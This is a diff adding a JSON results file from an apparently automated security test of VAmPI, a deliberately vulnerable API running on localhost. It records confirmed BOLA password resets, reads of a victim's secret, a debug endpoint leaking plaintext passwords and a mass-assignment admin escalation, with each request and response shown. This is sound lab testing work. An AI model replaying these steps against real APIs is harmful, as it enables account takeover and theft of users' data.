@@ -1,0 +1,174 @@
+{
+  "run_id": "2f7fd6",
+  "base": "http://127.0.0.1:5000",
+  "findings": [
+    "[1] User directory without authentication          CONFIRMED (API8/API3)",
+    "[2] Debug endpoint exposes passwords (no auth)     CONFIRMED (API8)",
+    "[3] User PII readable without any token            CONFIRMED (API3)",
+    "[4] READ BOLA - attacker reads victim book + secret CONFIRMED (API1:2023)",
+    "[5] WRITE BOLA - attacker set victim's password    CONFIRMED (API1:2023)",
+    "[6] Mass assignment -> self-promoted admin         CONFIRMED (API3:2023)"
+  ],
+  "evidence": [
+    {
+      "label": "health",
+      "method": "GET",
+      "path": "/",
+      "status": 200,
+      "body": "{ \"message\": \"VAmPI the Vulnerable API\", \"help\": \"VAmPI is a vulnerable on purpose API. It was created in order to evaluate the efficiency of third party tools in identifying vulnerabilities in APIs but it can also be used in learning/teaching purposes.\", \"vulnerable\":1}",
+      "with_token": false
+    },
+    {
+      "label": "db reset",
+      "method": "GET",
+      "path": "/createdb",
+      "status": 200,
+      "body": "{ \"message\": \"Database populated.\" }",
+      "with_token": false
+    },
+    {
+      "label": "register victim_2f7fd6_pejj",
+      "method": "POST",
+      "path": "/users/v1/register",
+      "status": 200,
+      "body": "{\"message\": \"Successfully registered. Login to receive an auth token.\", \"status\": \"success\"}",
+      "with_token": false
+    },
+    {
+      "label": "register attacker_2f7fd6_xihb",
+      "method": "POST",
+      "path": "/users/v1/register",
+      "status": 200,
+      "body": "{\"message\": \"Successfully registered. Login to receive an auth token.\", \"status\": \"success\"}",
+      "with_token": false
+    },
+    {
+      "label": "login victim_2f7fd6_pejj",
+      "method": "POST",
+      "path": "/users/v1/login",
+      "status": 200,
+      "body": "{\"auth_token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTI4MjA1ODQsImlhdCI6MTc5MjgyMDUyNCwic3ViIjoidmljdGltXzJmN2ZkNl9wZWpqIn0.q7Ik4nhlby4_abN6hR44OBJQdte0AlYAtnUSuKdvd9c\", \"message\": \"Successfully logged in.\", \"status\": \"success\"}",
+      "with_token": false
+    },
+    {
+      "label": "login attacker_2f7fd6_xihb",
+      "method": "POST",
+      "path": "/users/v1/login",
+      "status": 200,
+      "body": "{\"auth_token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTI4MjA1ODQsImlhdCI6MTc5MjgyMDUyNCwic3ViIjoiYXR0YWNrZXJfMmY3ZmQ2X3hpaGIifQ.JoM_Bwis8UfZLsV5gay57h3dL3aVQo4OBQAsw_JdeiA\", \"message\": \"Successfully logged in.\", \"status\": \"success\"}",
+      "with_token": false
+    },
+    {
+      "label": "victim creates private book",
+      "method": "POST",
+      "path": "/books/v1",
+      "status": 200,
+      "body": "{\"message\": \"Book has been added.\", \"status\": \"success\"}",
+      "with_token": true
+    },
+    {
+      "label": "no token",
+      "method": "GET",
+      "path": "/users/v1",
+      "status": 200,
+      "body": "{\n  \"users\": [\n    {\n      \"email\": \"mail1@mail.com\",\n      \"username\": \"name1\"\n    },\n    {\n      \"email\": \"mail2@mail.com\",\n      \"username\": \"name2\"\n    },\n    {\n      \"email\": \"admin@mail.com\",\n      \"username\": \"admin\"\n    },\n    {\n      \"email\": \"victim_2f7fd6_pejj@lab.local\",\n      \"username\": \"victim_2f7fd6_pejj\"\n    },\n    {\n      \"email\": \"attacker_2f7fd6_xihb@lab.local\",\n      \"username\": \"attacker_2f7fd6_xihb\"\n    }\n  ]\n}\n",
+      "with_token": false
+    },
+    {
+      "label": "no token",
+      "method": "GET",
+      "path": "/users/v1/_debug",
+      "status": 200,
+      "body": "{\n  \"users\": [\n    {\n      \"admin\": false,\n      \"email\": \"mail1@mail.com\",\n      \"password\": \"pass1\",\n      \"username\": \"name1\"\n    },\n    {\n      \"admin\": false,\n      \"email\": \"mail2@mail.com\",\n      \"password\": \"pass2\",\n      \"username\": \"name2\"\n    },\n    {\n      \"admin\": true,\n      \"email\": \"admin@mail.com\",\n      \"password\": \"pass1\",\n      \"username\": \"admin\"\n    },\n    {\n      \"admin\": false,\n      \"email\": \"victim_2f7fd6_pejj@lab.local\",\n      \"password\": \"VicPass_2f7fd6\",\n      \"username\": \"victim_2f7fd6_pejj\"\n    },\n    {\n      \"admin\": false,\n      \"email\": \"attacker_2f7fd6_xihb@lab.local\",\n      \"password\": \"AtkPass_2f7fd6\",\n      \"username\": \"attacker_2f7fd6_xihb\"\n    }\n  ]\n}\n",
+      "with_token": false
+    },
+    {
+      "label": "victim detail / no token",
+      "method": "GET",
+      "path": "/users/v1/victim_2f7fd6_pejj",
+      "status": 200,
+      "body": "{\"username\": \"victim_2f7fd6_pejj\", \"email\": \"victim_2f7fd6_pejj@lab.local\"}",
+      "with_token": false
+    },
+    {
+      "label": "control random user",
+      "method": "GET",
+      "path": "/users/v1/ghost_2f7fd6",
+      "status": 404,
+      "body": "{ \"status\": \"fail\", \"message\": \"User not found\"}",
+      "with_token": false
+    },
+    {
+      "label": "baseline",
+      "method": "GET",
+      "path": "/books/v1/lmxbook_2f7fd6",
+      "status": 200,
+      "body": "{\"book_title\": \"lmxbook_2f7fd6\", \"owner\": \"victim_2f7fd6_pejj\", \"secret\": \"LMX-SECRET-2f7fd6\"}",
+      "with_token": true
+    },
+    {
+      "label": "attack",
+      "method": "GET",
+      "path": "/books/v1/lmxbook_2f7fd6",
+      "status": 200,
+      "body": "{\"book_title\": \"lmxbook_2f7fd6\", \"owner\": \"victim_2f7fd6_pejj\", \"secret\": \"LMX-SECRET-2f7fd6\"}",
+      "with_token": true
+    },
+    {
+      "label": "control",
+      "method": "GET",
+      "path": "/books/v1/ghost_2f7fd6",
+      "status": 404,
+      "body": "{ \"status\": \"fail\", \"message\": \"Book not found!\"}",
+      "with_token": true
+    },
+    {
+      "label": "attack write",
+      "method": "PUT",
+      "path": "/users/v1/victim_2f7fd6_pejj/password",
+      "status": 204,
+      "body": "",
+      "with_token": true
+    },
+    {
+      "label": "login victim_2f7fd6_pejj",
+      "method": "POST",
+      "path": "/users/v1/login",
+      "status": 200,
+      "body": "{ \"status\": \"fail\", \"message\": \"Password is not correct for the given username.\"}",
+      "with_token": false
+    },
+    {
+      "label": "login victim_2f7fd6_pejj",
+      "method": "POST",
+      "path": "/users/v1/login",
+      "status": 200,
+      "body": "{\"auth_token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTI4MjA1ODQsImlhdCI6MTc5MjgyMDUyNCwic3ViIjoidmljdGltXzJmN2ZkNl9wZWpqIn0.q7Ik4nhlby4_abN6hR44OBJQdte0AlYAtnUSuKdvd9c\", \"message\": \"Successfully logged in.\", \"status\": \"success\"}",
+      "with_token": false
+    },
+    {
+      "label": "register pwned_2f7fd6_ruql",
+      "method": "POST",
+      "path": "/users/v1/register",
+      "status": 200,
+      "body": "{\"message\": \"Successfully registered. Login to receive an auth token.\", \"status\": \"success\"}",
+      "with_token": false
+    },
+    {
+      "label": "login pwned_2f7fd6_ruql",
+      "method": "POST",
+      "path": "/users/v1/login",
+      "status": 200,
+      "body": "{\"auth_token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTI4MjA1ODQsImlhdCI6MTc5MjgyMDUyNCwic3ViIjoicHduZWRfMmY3ZmQ2X3J1cWwifQ.VoM7UPDhJQEUwQdrBMI96KEOy4jhCRAMgeI3LnXwpbs\", \"message\": \"Successfully logged in.\", \"status\": \"success\"}",
+      "with_token": false
+    },
+    {
+      "label": "whoami pwned",
+      "method": "GET",
+      "path": "/me",
+      "status": 200,
+      "body": "{\"data\": {\"admin\": true, \"email\": \"pwned_2f7fd6_ruql@lab.local\", \"username\": \"pwned_2f7fd6_ruql\"}, \"status\": \"success\"}",
+      "with_token": true
+    }
+  ]
+}
